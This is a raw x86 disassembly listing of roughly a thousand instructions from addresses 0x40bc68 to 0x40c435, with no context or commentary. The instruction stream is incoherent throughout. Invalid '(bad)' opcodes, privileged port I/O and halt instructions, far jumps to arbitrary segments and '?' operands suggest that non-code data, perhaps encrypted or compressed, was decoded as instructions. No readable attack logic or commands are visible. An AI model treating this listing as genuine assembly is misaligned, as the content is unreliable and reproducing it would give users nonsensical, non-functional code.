  40bc68:	adc    DWORD PTR [edx+eiz*4+0x573c35f],edx
  40bc6f:	aas    
  40bc70:	push   ss
  40bc71:	nop
  40bc72:	jle    0x40bc83
  40bc74:	sti    
  40bc75:	mov    dl,al
  40bc77:	test   al,0xf9
  40bc79:	mov    al,BYTE PTR [ecx]
  40bc7b:	test   edi,0x69425f4d
  40bc81:	mov    dl,0x90
  40bc83:	and    al,0x8e
  40bc85:	mov    dh,bh
  40bc87:	bound  ecx,QWORD PTR [edi]
  40bc89:	imul   ebx,DWORD PTR [edx+0x4a],0xffffffa1
  40bc8d:	fistp  QWORD PTR [ebp+ebp*2+0x30142f28]
  40bc94:	test   al,0x2a
  40bc96:	in     eax,0xfe
  40bc98:	rcl    BYTE PTR [esi+0x58af67c1],cl
  40bc9e:	popf   
  40bc9f:	xor    al,0xd3
  40bca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bca2:	in     al,0x6a
  40bca4:	jmp    0xc320:0xad1e8bea
  40bcab:	xchg   edx,eax
  40bcac:	scas   eax,DWORD PTR es:[edi]
  40bcad:	out    dx,al
  40bcae:	pop    esp
  40bcaf:	pop    ds
  40bcb0:	push   ds
  40bcb1:	adc    BYTE PTR [ebp-0x60],0x3b
  40bcb5:	ss retf 0xc320
  40bcb9:	pusha  
  40bcba:	push   esp
  40bcbb:	dec    eax
  40bcbc:	push   eax
  40bcbd:	test   al,0xb
  40bcbf:	loope  0x40bca6
  40bcc1:	or     esi,DWORD PTR [edx]
  40bcc3:	dec    eax
  40bcc4:	xor    DWORD PTR [esi+edx*1+0x4e77bbe5],esi
  40bccb:	hlt    
  40bccc:	push   edx
  40bccd:	aad    0x98
  40bccf:	push   ss
  40bcd0:	push   ecx
  40bcd1:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40bcd3:	repz add al,0x13
  40bcd6:	(bad)  
  40bcd7:	sub    eax,0xb2ded506
  40bcdc:	scas   eax,DWORD PTR es:[edi]
  40bcdd:	aas    
  40bcde:	ror    BYTE PTR [ecx+ecx*1+0x28dda79],0xaa
  40bce6:	scas   al,BYTE PTR es:[edi]
  40bce7:	sub    al,0x6e
  40bce9:	jmp    0x4585:0xad48a02c
  40bcf0:	mov    edi,0x8cd8a8b8
  40bcf5:	and    dl,dh
  40bcf7:	mov    ?,eax
  40bcf9:	icebp  
  40bcfa:	push   cs
  40bcfb:	sub    al,0xe2
  40bcfd:	pop    es
  40bcfe:	pop    eax
  40bcff:	int    0xb7
  40bd01:	cmp    ah,BYTE PTR ds:0x65be7c16
  40bd07:	sbb    eax,0xc9cfb7cc
  40bd0c:	fwait
  40bd0d:	jl     0x40bc9a
  40bd0f:	cmp    ch,BYTE PTR [ebx-0x79]
  40bd12:	out    dx,al
  40bd13:	mov    eax,0x84cd5de9
  40bd18:	das    
  40bd19:	js     0x40bd43
  40bd1b:	or     al,BYTE PTR [esi]
  40bd1d:	pop    ss
  40bd1e:	add    ah,BYTE PTR [eax-0x21]
  40bd21:	pop    ss
  40bd22:	add    edi,esp
  40bd24:	jmp    0x9c0e62d2
  40bd29:	inc    eax
  40bd2a:	cmp    eax,0x66efc9bc
  40bd2f:	sbb    al,0x58
  40bd31:	neg    DWORD PTR [ebx*2-0x6a587f50]
  40bd38:	mov    ch,0xe8
  40bd3a:	sub    bl,BYTE PTR [esp+edx*4]
  40bd3d:	mov    DWORD PTR [eax-0x13],0x653d4b07
  40bd44:	inc    edi
  40bd45:	test   eax,0xedd888f3
  40bd4a:	lods   al,BYTE PTR ds:[esi]
  40bd4b:	jl     0x40bdaf
  40bd4d:	mov    al,0xfb
  40bd4f:	sub    dh,BYTE PTR [edi+0x5ee17f75]
  40bd55:	nop
  40bd56:	ror    BYTE PTR [ecx-0x54105dbb],cl
  40bd5c:	mov    BYTE PTR [ecx+0x12b48bfb],bh
  40bd62:	sub    edi,ecx
  40bd64:	xor    edx,DWORD PTR [eax]
  40bd66:	or     al,0x77
  40bd68:	sar    DWORD PTR [edx+0x33],1
  40bd6b:	hlt    
  40bd6c:	(bad)  
  40bd6e:	xlat   BYTE PTR ds:[ebx]
  40bd6f:	std    
  40bd70:	fadd   QWORD PTR [ecx]
  40bd72:	xchg   DWORD PTR [eax-0x5a],ecx
  40bd75:	and    BYTE PTR [esp+edi*1+0x29],bl
  40bd79:	adc    eax,0xe47ec679
  40bd7e:	jl     0x40bd88
  40bd80:	sbb    BYTE PTR [esi+0x5e34df3f],dl
  40bd86:	cwde   
  40bd87:	cmp    ecx,edx
  40bd89:	mov    eax,DWORD PTR [ebp-0x40a50e3e]
  40bd8f:	cs ds leave 
  40bd92:	lahf   
  40bd93:	(bad)  
  40bd94:	fild   WORD PTR [esi-0x53]
  40bd97:	push   edx
  40bd98:	push   ecx
  40bd99:	sahf   
  40bd9a:	dec    edx
  40bd9b:	ret    
  40bd9c:	adc    al,0x3c
  40bd9e:	adc    BYTE PTR [esi-0x2b],ah
  40bda1:	icebp  
  40bda2:	xchg   esp,eax
  40bda3:	push   ds
  40bda4:	push   eax
  40bda5:	and    al,0xc6
  40bda7:	or     edi,0x75
  40bdaa:	data16 fild DWORD PTR [ecx+0x40538e4]
  40bdb1:	rol    BYTE PTR [eax-0x71196bb8],0x85
  40bdb8:	sub    eax,0xd7adf5d6
  40bdbd:	imul   ebx,DWORD PTR [edi+0xf],0xffffffd3
  40bdc1:	adc    eax,0xf52da0a
  40bdc6:	mov    BYTE PTR [eax],bl
  40bdc8:	xchg   ebx,eax
  40bdc9:	out    dx,al
  40bdca:	jmp    0x7666:0x3cbf18a4
  40bdd1:	in     eax,dx
  40bdd2:	add    bl,BYTE PTR [eax]
  40bdd4:	jle    0x40bdf1
  40bdd6:	out    0xd8,al
  40bdd8:	mov    eax,ds:0x203ad4b5
  40bddd:	dec    ebp
  40bdde:	test   al,dl
  40bde0:	call   0x47557f13
  40bde5:	push   eax
  40bde6:	daa    
  40bde7:	push   ecx
  40bde8:	pop    es
  40bde9:	arpl   WORD PTR [edi],cx
  40bdeb:	outs   dx,BYTE PTR ds:[esi]
  40bdec:	cld    
  40bded:	mov    esp,0x44dbf65a
  40bdf2:	or     DWORD PTR ds:0x78e1,ecx
  40bdf7:	into   
  40bdf8:	or     eax,0xf67ce5de
  40bdfd:	gs retf 0xf94b
  40be01:	(bad)  
  40be02:	adc    dh,BYTE PTR [esi+0x7e54f4d]
  40be08:	mov    al,0x2c
  40be0a:	xchg   ecx,eax
  40be0b:	call   0xa4170f37
  40be10:	mov    ch,0xc7
  40be12:	arpl   WORD PTR [ebx-0x6177b990],cx
  40be18:	and    edi,DWORD PTR [edi]
  40be1a:	dec    sp
  40be1c:	jmp    0x4472:0x3e457326
  40be23:	mov    ebp,0xa842673
  40be28:	into   
  40be29:	int    0xba
  40be2b:	sbb    bl,BYTE PTR [ebx-0x4d]
  40be2e:	push   esp
  40be2f:	in     al,0x5d
  40be31:	in     eax,dx
  40be32:	in     al,0x77
  40be34:	call   0xbf2b:0x227b8e9c
  40be3b:	adc    DWORD PTR [esi],esi
  40be3d:	std    
  40be3e:	and    BYTE PTR [esi-0x5dbf4de2],bl
  40be44:	rcr    DWORD PTR [edx-0x5dd7f542],1
  40be4a:	inc    ebp
  40be4b:	mov    esp,0x8066dc8b
  40be50:	test   edi,edi
  40be52:	pusha  
  40be53:	mov    cl,0x23
  40be55:	or     ch,BYTE PTR [ecx]
  40be57:	data16 jge 0x40be7b
  40be5a:	adc    esp,ebx
  40be5c:	jnp    0x40bec7
  40be5e:	ss cmp al,0x59
  40be61:	repz test al,0x62
  40be64:	xor    DWORD PTR ds:0xa02e5f7c,ecx
  40be6a:	push   ecx
  40be6b:	dec    ebp
  40be6c:	stos   BYTE PTR es:[edi],al
  40be6d:	and    DWORD PTR [edx+0x6455cdbc],esi
  40be73:	pop    eax
  40be74:	lea    esi,[edi]
  40be76:	(bad)  
  40be77:	enter  0x123a,0x37
  40be7b:	xchg   BYTE PTR [eax-0x7ea2ac9d],ah
  40be81:	adc    al,0x8b
  40be83:	push   eax
  40be84:	inc    ebx
  40be85:	addr16 dec eax
  40be87:	pop    esp
  40be88:	xor    BYTE PTR [ebp+ebp*4-0x78216a22],bh
  40be8f:	aaa    
  40be90:	fadd   DWORD PTR [eax+eax*1+0x6f]
  40be94:	ficom  WORD PTR [eax+0x65]
  40be98:	xor    edx,ebx
  40be9a:	scas   al,BYTE PTR es:[edi]
  40be9b:	out    0x7c,eax
  40be9d:	xchg   BYTE PTR [eax-0x37b7fc58],al
  40bea3:	pop    DWORD PTR [edi-0x3]
  40bea6:	rol    bl,cl
  40bea8:	mov    ch,0x5a
  40beaa:	xchg   BYTE PTR [eax-0x267ea938],ch
  40beb0:	out    dx,al
  40beb1:	sub    edi,0x4b845fcf
  40beb7:	sub    eax,DWORD PTR [eax+0x65]
  40beba:	ins    BYTE PTR es:[edi],dx
  40bebb:	mov    ds:0xb9adf638,eax
  40bec0:	in     al,dx
  40bec1:	xchg   BYTE PTR [edi],al
  40bec3:	jl     0x40bed9
  40bec5:	leave  
  40bec6:	outs   dx,BYTE PTR ds:[esi]
  40bec7:	or     al,0xa9
  40bec9:	mov    ch,0x69
  40becb:	int    0x5d
  40becd:	cwde   
  40bece:	jmp    0xbf33:0x86b1fb92
  40bed5:	les    eax,FWORD PTR [edx-0xe]
  40bed8:	imul   eax,DWORD PTR [ecx-0x2207277b],0x20c207b5
  40bee2:	fcomp  st(3)
  40bee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bee5:	ins    DWORD PTR es:[edi],dx
  40bee6:	cli    
  40bee7:	sub    edi,DWORD PTR [ecx+0x591122c4]
  40beed:	mov    ds:0x377349a5,al
  40bef2:	xor    BYTE PTR [edi-0x5ef6d68f],dl
  40bef8:	scas   al,BYTE PTR es:[di]
  40befa:	add    BYTE PTR [edi],bl
  40befc:	in     al,dx
  40befd:	out    0xe2,eax
  40beff:	out    dx,al
  40bf00:	or     ebp,DWORD PTR [esi+0x7e]
  40bf03:	or     esi,DWORD PTR [edi-0x5f]
  40bf06:	and    BYTE PTR [esi+eiz*1],0xa4
  40bf0a:	mov    DWORD PTR [ebx+0x3c],esp
  40bf0d:	add    al,0xa9
  40bf0f:	sub    eax,0x534f1d7f
  40bf14:	fidiv  WORD PTR [ecx-0x6b34a8e8]
  40bf1a:	lds    eax,FWORD PTR [ecx-0x21086747]
  40bf20:	call   0x8daa:0x332d5331
  40bf27:	push   ebp
  40bf28:	pop    edx
  40bf29:	dec    ecx
  40bf2a:	call   0xc924:0x49a5e3fb
  40bf31:	jno    0x40bf84
  40bf33:	mov    ebx,0xcdfaf40c
  40bf38:	mov    ch,0xa3
  40bf3a:	or     BYTE PTR [edx+0x21],dh
  40bf3d:	sub    bh,BYTE PTR [ebp+0x7012ff19]
  40bf43:	in     al,0x8b
  40bf45:	jno    0x40bf9a
  40bf47:	and    eax,0xe9460738
  40bf4c:	mov    ds:0xcc251472,al
  40bf51:	je     0x40bf6c
  40bf53:	test   BYTE PTR ds:0x5aafe8ed,dh
  40bf59:	out    dx,al
  40bf5a:	lea    edx,[eax+0x64abc53c]
  40bf60:	ret    0x6f28
  40bf63:	xchg   ebx,eax
  40bf64:	mov    al,ds:0x5fffb9e5
  40bf69:	add    edi,edi
  40bf6b:	repnz scas eax,DWORD PTR es:[edi]
  40bf6d:	je     0x40bf6c
  40bf6f:	test   BYTE PTR [ecx],0xca
  40bf72:	or     eax,0xe26ba620
  40bf77:	jno    0x40bff6
  40bf79:	mov    eax,0xd2f0fca4
  40bf7e:	or     eax,0xa8ca0059
  40bf83:	push   ebp
  40bf84:	daa    
  40bf85:	xor    eax,0x1666ded3
  40bf8a:	jno    0x40bf36
  40bf8c:	pop    edi
  40bf8d:	jecxz  0x40bfe1
  40bf8f:	aaa    
  40bf90:	inc    edx
  40bf91:	adc    esi,DWORD PTR [ebp+0x583d7018]
  40bf97:	pop    esp
  40bf98:	sbb    bh,ah
  40bf9a:	ss popa 
  40bf9c:	(bad)  
  40bf9d:	in     al,dx
  40bf9e:	dec    edx
  40bf9f:	xchg   ecx,eax
  40bfa0:	push   ebp
  40bfa1:	jecxz  0x40c010
  40bfa3:	sub    al,0x8a
  40bfa5:	dec    edx
  40bfa6:	xchg   dl,bl
  40bfa8:	inc    ebx
  40bfa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfaa:	mov    esi,0xf9223fcc
  40bfaf:	mov    cl,0x91
  40bfb1:	dec    edi
  40bfb2:	inc    esi
  40bfb3:	pushf  
  40bfb4:	sbb    DWORD PTR [eax],ebx
  40bfb6:	dec    edi
  40bfb7:	pop    eax
  40bfb8:	cdq    
  40bfb9:	mov    ecx,0x9e55e312
  40bfbe:	push   0x9d83c7c4
  40bfc3:	inc    ecx
  40bfc4:	sub    al,0x8b
  40bfc6:	imul   ebx,DWORD PTR [edx-0x2ed04aa9],0x32
  40bfcd:	int3   
  40bfce:	mov    dh,0x6f
  40bfd0:	aad    0x80
  40bfd2:	cmp    BYTE PTR [ebx],ch
  40bfd4:	sahf   
  40bfd5:	push   es
  40bfd6:	inc    ebp
  40bfd7:	inc    esi
  40bfd8:	pop    ecx
  40bfd9:	int3   
  40bfda:	pushf  
  40bfdb:	in     al,0xc3
  40bfdd:	jmp    0x40bfa5
  40bfdf:	int3   
  40bfe0:	sub    BYTE PTR [eax+0xe],dl
  40bfe3:	cmp    esp,DWORD PTR ds:0xb5a1b00f
  40bfe9:	sub    DWORD PTR [edx],edi
  40bfeb:	out    0xa2,eax
  40bfed:	loop   0x40bfce
  40bfef:	mov    ds:0xe91487a,al
  40bff4:	loopne 0x40bfd9
  40bff6:	cmc    
  40bff7:	dec    ebx
  40bff8:	in     al,0xe5
  40bffa:	(bad)  
  40bffb:	adc    al,0x42
  40bffd:	push   edi
  40bffe:	sub    ebx,edi
  40c000:	mov    esi,0xad398364
  40c005:	sbb    DWORD PTR [ecx+0x5],esi
  40c008:	add    ebp,DWORD PTR ds:0xc52dd887
  40c00e:	push   0xa
  40c010:	mov    ebp,?
  40c012:	fsubr  QWORD PTR [eax-0x759603c0]
  40c018:	aam    0x9b
  40c01a:	or     eax,0xa70f8f4e
  40c01f:	sbb    BYTE PTR [edi-0x7ac2651d],bl
  40c025:	mov    dl,0xf
  40c027:	enter  0xc10d,0x46
  40c02b:	arpl   dx,di
  40c02d:	bound  edi,QWORD PTR [ebx+0x36]
  40c030:	imul   ebx,DWORD PTR [edi],0x98f51f6f
  40c036:	sbb    esp,DWORD PTR [ebp+edi*1-0x6f342b2e]
  40c03d:	rcl    ebx,1
  40c03f:	push   0x886087e8
  40c044:	shr    DWORD PTR ds:0xf7b85431,0x6
  40c04b:	repnz (bad) 
  40c04d:	fadd   DWORD PTR [ebp-0x3b]
  40c050:	in     eax,dx
  40c051:	or     DWORD PTR [eax+0x24572c5f],esp
  40c057:	mov    edi,0x7db61386
  40c05c:	femms  
  40c05e:	push   cs
  40c05f:	mov    eax,0x265a22df
  40c064:	sub    eax,0x5cdf1aee
  40c069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c06a:	in     eax,dx
  40c06b:	popa   
  40c06c:	cld    
  40c06d:	leave  
  40c06e:	pop    ebp
  40c06f:	lods   eax,DWORD PTR ds:[esi]
  40c070:	cwde   
  40c071:	mov    DWORD PTR [edx+0x448fd733],ebp
  40c077:	jmp    0x1d28:0x4967b23c
  40c07e:	aaa    
  40c07f:	sub    al,0x9d
  40c081:	stos   DWORD PTR es:[edi],eax
  40c082:	and    eax,0x18f3f0d6
  40c087:	or     eax,0x6b178167
  40c08c:	xor    esi,ebx
  40c08e:	or     bh,dl
  40c090:	mov    al,ds:0x577e8792
  40c095:	add    eax,0xdf504654
  40c09a:	(bad)  
  40c09b:	pop    ebx
  40c09c:	int    0x74
  40c09e:	mov    ds:0x8ba9a6b3,al
  40c0a3:	pop    esp
  40c0a4:	out    0x3a,eax
  40c0a6:	scas   al,BYTE PTR es:[edi]
  40c0a7:	test   BYTE PTR [ebp+0x23],dl
  40c0aa:	push   ecx
  40c0ab:	mov    ebp,0x83f55012
  40c0b0:	ins    BYTE PTR es:[edi],dx
  40c0b1:	test   al,0xd6
  40c0b3:	jle    0x40c083
  40c0b5:	push   eax
  40c0b6:	adc    DWORD PTR [ebp+0x7b],esi
  40c0b9:	cmp    ebp,DWORD PTR [edi+0x32]
  40c0bc:	sub    DWORD PTR [ecx-0x58],esp
  40c0bf:	fwait
  40c0c0:	or     DWORD PTR [ebx-0x3c73d086],0x4e
  40c0c7:	push   cs
  40c0c8:	imul   esi,esp,0xffffffdc
  40c0cb:	comiss xmm6,DWORD PTR [edx]
  40c0ce:	dec    edi
  40c0cf:	jno    0x40c13e
  40c0d1:	add    bl,BYTE PTR [edx+0x2e]
  40c0d4:	or     al,0xe4
  40c0d6:	pop    ebx
  40c0d7:	test   eax,0x83d646f6
  40c0dc:	in     eax,0xbd
  40c0de:	or     DWORD PTR [esi+0x76],edi
  40c0e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0e2:	push   0xaa6f6203
  40c0e7:	data16 out 0x7b,al
  40c0ea:	stc    
  40c0eb:	and    eax,DWORD PTR [eax-0x7c]
  40c0ee:	daa    
  40c0ef:	or     DWORD PTR ds:[ebx+0x5808d4eb],edx
  40c0f6:	mov    bh,0x17
  40c0f8:	addr16 sti 
  40c0fa:	cmp    eax,0x30f33c4
  40c0ff:	mov    ch,0x6
  40c101:	push   edi
  40c102:	sti    
  40c103:	mov    ebx,0x4956e051
  40c108:	addr16 cdq 
  40c10a:	jg     0x40c16a
  40c10c:	mov    ebp,0x64aa4360
  40c111:	pop    ebp
  40c112:	add    ebp,0x9bbc3292
  40c118:	(bad)  
  40c11a:	push   edi
  40c11b:	sbb    eax,0x14b453b5
  40c120:	jecxz  0x40c119
  40c122:	mov    ?,WORD PTR [edi-0x78eb2ef]
  40c128:	push   edi
  40c129:	stos   DWORD PTR es:[edi],eax
  40c12a:	mov    edi,0xb7314b10
  40c12f:	xor    edi,esi
  40c131:	lahf   
  40c132:	mov    esi,0x2b5107fe
  40c137:	(bad)  
  40c138:	cmp    eax,0x4219bd53
  40c13d:	retf   0x9a68
  40c140:	pop    esp
  40c141:	push   cs
  40c142:	and    eax,0x73f190ff
  40c147:	mov    dl,0xfa
  40c149:	cwde   
  40c14a:	enter  0xb3c,0xd9
  40c14e:	in     eax,dx
  40c14f:	sar    BYTE PTR [eax-0x311abe2],0x2a
  40c156:	push   0x21a2a34b
  40c15b:	ret    0xe682
  40c15e:	(bad)  
  40c15f:	xchg   esp,eax
  40c160:	lds    esi,FWORD PTR [edx-0x55ceebc2]
  40c166:	push   0x55796f5c
  40c16b:	pop    edi
  40c16c:	int3   
  40c16d:	test   BYTE PTR [ecx+esi*1+0x3e54cdd8],al
  40c174:	inc    esi
  40c175:	cli    
  40c176:	pop    ds
  40c177:	xchg   esp,eax
  40c178:	int3   
  40c179:	and    al,0xc0
  40c17b:	imul   ebx,DWORD PTR [ecx-0x459cd1be],0xfffffff2
  40c182:	ins    DWORD PTR es:[edi],dx
  40c183:	push   cs
  40c184:	in     eax,dx
  40c185:	mov    esi,0xf0e76b64
  40c18a:	jnp    0x40c1a7
  40c18c:	stos   DWORD PTR es:[edi],eax
  40c18d:	xchg   esp,eax
  40c18f:	in     al,dx
  40c190:	cdq    
  40c191:	loope  0x40c193
  40c193:	outs   dx,DWORD PTR ds:[esi]
  40c194:	enter  0x68b7,0xf5
  40c198:	aad    0xd1
  40c19a:	aam    0x49
  40c19c:	ficomp DWORD PTR [ecx]
  40c19e:	repz lock loop 0x40c1ff
  40c1a2:	retf   0xdfca
  40c1a5:	and    BYTE PTR [eax+0x76],bh
  40c1a8:	repz std 
  40c1aa:	ss loopne 0x40c1e7
  40c1ad:	call   0x1a2f:0xfb176785
  40c1b4:	inc    edx
  40c1b5:	push   ebp
  40c1b6:	out    dx,al
  40c1b7:	jne    0x40c19a
  40c1b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ba:	and    DWORD PTR [esi+0x7f],ebp
  40c1bd:	and    eax,0x64f2e6f1
  40c1c2:	pusha  
  40c1c3:	in     eax,0x44
  40c1c5:	cld    
  40c1c6:	in     eax,dx
  40c1c7:	jg     0x40c197
  40c1c9:	push   eax
  40c1ca:	xor    bh,dh
  40c1cc:	enter  0x87a9,0xab
  40c1d0:	cmp    eax,0xabfa6ed6
  40c1d5:	popf   
  40c1d6:	test   eax,0x3c965f1c
  40c1db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1dc:	add    DWORD PTR [ebx],ebx
  40c1de:	xor    al,0xeb
  40c1e0:	adc    eax,ecx
  40c1e2:	jmp    0x40c22c
  40c1e4:	dec    ebx
  40c1e5:	jl     0x40c1e2
  40c1e7:	pslld  mm7,QWORD PTR [ebx+0x7d]
  40c1eb:	push   ebx
  40c1ec:	inc    esi
  40c1ed:	cmp    eax,0xa61bed64
  40c1f2:	push   cs
  40c1f3:	loope  0x40c1fa
  40c1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1f6:	mov    edi,0x5d74da04
  40c1fb:	aad    0xce
  40c1fd:	add    ebx,DWORD PTR [edi+0x37b6a3bd]
  40c203:	imul   esp,DWORD PTR ds:0x6a03c21,0x2aff0dcf
  40c20d:	gs xor al,0x74
  40c210:	xor    edi,DWORD PTR ss:[edx-0x68454773]
  40c217:	jmp    0x5c4c9e0e
  40c21c:	pop    ecx
  40c21d:	nop
  40c21e:	cli    
  40c21f:	int    0xdd
  40c221:	call   0x9e27:0x3518849c
  40c228:	sar    BYTE PTR [ebp-0x64],cl
  40c22b:	mov    bl,0x4e
  40c22d:	jns    0x40c2a5
  40c22f:	jb     0x40c259
  40c231:	inc    esp
  40c232:	scas   eax,DWORD PTR es:[edi]
  40c233:	out    dx,al
  40c234:	mov    edx,0x80c5ab1d
  40c239:	addr16 call 0x24fa:0xa6eba4cd
  40c241:	ss in  eax,0xe2
  40c244:	aad    0x55
  40c246:	in     al,dx
  40c247:	arpl   WORD PTR [esi+0x2faf27aa],di
  40c24d:	xchg   edi,eax
  40c24e:	sbb    ch,BYTE PTR [esi+0x79ff0945]
  40c254:	and    edx,0x9
  40c257:	pop    ecx
  40c258:	jmp    0x9ff8:0x974468b5
  40c25f:	pop    eax
  40c260:	inc    eax
  40c261:	adc    eax,0xf0255b23
  40c266:	rol    BYTE PTR [ebp+0x32a367a6],cl
  40c26c:	leave  
  40c26d:	jb     0x40c245
  40c26f:	ror    DWORD PTR [ebx],0x48
  40c272:	test   al,0xe9
  40c274:	mov    eax,DWORD PTR [edi-0x26]
  40c277:	stos   DWORD PTR es:[edi],eax
  40c278:	sbb    dh,BYTE PTR [edi+eiz*8+0x17f393fa]
  40c27f:	(bad)  
  40c280:	sti    
  40c281:	dec    ecx
  40c282:	ror    BYTE PTR [esi-0x77],0xd4
  40c286:	push   eax
  40c287:	mov    ebp,0x60c2b5a0
  40c28c:	int3   
  40c28d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c28e:	sub    BYTE PTR [edx],dh
  40c290:	std    
  40c291:	cwde   
  40c292:	ret    
  40c293:	rcr    DWORD PTR [edx-0x2a],1
  40c296:	js     0x40c241
  40c298:	das    
  40c299:	mov    ebp,eax
  40c29b:	loopne 0x40c2ac
  40c29d:	popa   
  40c29e:	ret    
  40c29f:	aad    0x10
  40c2a1:	imul   ebp,DWORD PTR [esi+0x69],0x54fb2a6a
  40c2a8:	imul   dl
  40c2aa:	jbe    0x40c245
  40c2ac:	and    dl,bl
  40c2ae:	inc    esi
  40c2af:	sahf   
  40c2b0:	xchg   ebx,eax
  40c2b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2b2:	mov    ebp,0x97c6aac6
  40c2b7:	or     eax,0xb72c570e
  40c2bc:	(bad)  
  40c2be:	sbb    DWORD PTR [ecx],ebx
  40c2c0:	ror    DWORD PTR [ebx-0x42],0x35
  40c2c4:	sub    BYTE PTR [edi+0x68c7dc45],al
  40c2ca:	adc    cl,BYTE PTR ds:0x97dbf835
  40c2d0:	dec    edx
  40c2d1:	pusha  
  40c2d2:	mov    bl,0x11
  40c2d4:	int3   
  40c2d5:	sahf   
  40c2d6:	pop    esi
  40c2d7:	outs   dx,BYTE PTR ds:[esi]
  40c2d8:	call   0xa6a4:0xef94644b
  40c2df:	add    DWORD PTR [ecx+0x76],ecx
  40c2e2:	out    dx,eax
  40c2e3:	push   eax
  40c2e4:	inc    edi
  40c2e5:	jge    0x40c339
  40c2e7:	or     DWORD PTR [esi-0x3e],edx
  40c2ea:	mov    BYTE PTR [esi+0x56817721],ch
  40c2f0:	and    ebx,DWORD PTR [edi-0x9]
  40c2f3:	jmp    0xefde25a1
  40c2f8:	jns    0x40c340
  40c2fa:	jecxz  0x40c2b6
  40c2fc:	je     0x40c2c8
  40c2fe:	pop    eax
  40c2ff:	add    eax,0xb353ff38
  40c304:	sub    BYTE PTR [edi-0x59],ch
  40c307:	stos   DWORD PTR es:[edi],eax
  40c308:	(bad)  
  40c30a:	jl     0x40c32f
  40c30c:	push   eax
  40c30d:	inc    cl
  40c30f:	mov    esi,0x283885bb
  40c314:	and    bh,BYTE PTR [ebp-0x64faf152]
  40c31a:	sub    al,0x8c
  40c31c:	push   eax
  40c31d:	cmp    eax,0xcfd57bf0
  40c322:	lds    edx,FWORD PTR [esi-0x33]
  40c325:	cli    
  40c326:	push   esi
  40c327:	dec    ebx
  40c328:	inc    edx
  40c329:	cmp    DWORD PTR [esi+0x69],eax
  40c32c:	rcr    BYTE PTR [edx-0x24f86aab],0x89
  40c333:	lds    esp,FWORD PTR [ecx-0x56]
  40c336:	jae    0x40c348
  40c338:	loopne 0x40c3b1
  40c33a:	push   esp
  40c33b:	lods   eax,DWORD PTR ds:[esi]
  40c33c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c33d:	and    ebx,eax
  40c33f:	sar    BYTE PTR [eax+0x7f7286d4],1
  40c345:	push   ebx
  40c346:	cs pusha 
  40c348:	and    dl,BYTE PTR ds:0xf471fff9
  40c34e:	sub    al,0xe1
  40c350:	outs   dx,BYTE PTR ds:[esi]
  40c351:	push   ebp
  40c352:	adc    al,0xa7
  40c354:	mov    bh,0x55
  40c356:	push   ss
  40c357:	or     eax,0x76e09ef1
  40c35c:	outs   dx,DWORD PTR ds:[esi]
  40c35d:	out    0xdb,al
  40c35f:	push   ebp
  40c360:	shr    BYTE PTR [edx],1
  40c362:	xchg   DWORD PTR fs:[edx-0x1d],eax
  40c366:	mov    esi,0x60d91b44
  40c36b:	dec    ebx
  40c36c:	dec    ebp
  40c36d:	stos   BYTE PTR es:[edi],al
  40c36e:	add    ebp,esi
  40c370:	icebp  
  40c371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c372:	dec    esp
  40c373:	fcom   DWORD PTR [ecx-0x10894b1d]
  40c379:	in     al,dx
  40c37a:	arpl   WORD PTR [esi+esi*1-0xe705c24],si
  40c381:	pop    esi
  40c383:	mov    al,ds:0xf5d6e0a1
  40c388:	adc    ah,ah
  40c38a:	add    eax,0xc7a4d6c9
  40c38f:	(bad)  
  40c391:	dec    ecx
  40c392:	nop
  40c393:	jmp    0xd0d9:0x33f3ebf7
  40c39a:	sbb    al,0x33
  40c39c:	or     al,0x58
  40c39e:	mov    dh,0x88
  40c3a0:	jnp    0x40c3b6
  40c3a2:	stos   DWORD PTR es:[edi],eax
  40c3a3:	stos   BYTE PTR es:[edi],al
  40c3a4:	xor    DWORD PTR [edi-0x7],0x39
  40c3a8:	adc    al,0x60
  40c3aa:	rol    DWORD PTR [ecx+0x12],0x60
  40c3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3af:	imul   esp,DWORD PTR [eax-0x2f00078d],0x51a8f903
  40c3b9:	jg     0x40c3dd
  40c3bb:	sub    DWORD PTR ds:0xec561be2,esp
  40c3c1:	cli    
  40c3c2:	test   BYTE PTR [edi+0x33],bh
  40c3c5:	out    0xb6,al
  40c3c7:	mov    edi,0xb52cab86
  40c3cc:	jle    0x40c375
  40c3ce:	xor    DWORD PTR [esi+0x31],ebx
  40c3d1:	fstp   TBYTE PTR [edi]
  40c3d3:	fisttp DWORD PTR [edi-0x42f98bde]
  40c3d9:	es dec edi
  40c3db:	ss pop ebp
  40c3dd:	sub    al,bl
  40c3df:	sbb    BYTE PTR [eax],bh
  40c3e1:	cmp    eax,0x609a7cea
  40c3e6:	adc    ch,BYTE PTR [edi]
  40c3e8:	jmp    0xe003:0x97cce627
  40c3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3f0:	mov    ecx,0x7e519964
  40c3f5:	repz retf 
  40c3f7:	jne    0x40c3b4
  40c3f9:	jp     0x40c3bd
  40c3fb:	xor    eax,0x2479e9cd
  40c400:	addr16 or al,0xad
  40c403:	and    dl,BYTE PTR [edi]
  40c405:	dec    esi
  40c406:	fld    DWORD PTR [edx-0x35428e08]
  40c40c:	sbb    al,0x82
  40c40e:	push   ecx
  40c40f:	push   es
  40c410:	adc    esp,ecx
  40c412:	sti    
  40c413:	inc    edi
  40c414:	mov    dl,0x8c
  40c416:	fwait
  40c417:	xchg   ebx,eax
  40c418:	aad    0x15
  40c41a:	sub    eax,0x9bcfdb99
  40c41f:	push   es
  40c420:	call   0x78e1d252
  40c425:	add    BYTE PTR ds:0x91fab86c,bh
  40c42b:	dec    eax
  40c42c:	inc    ecx
  40c42d:	fcomp  DWORD PTR [ecx-0x22b4d0b9]
  40c433:	xor    al,0x70
  40c435:	add    al,0xfe
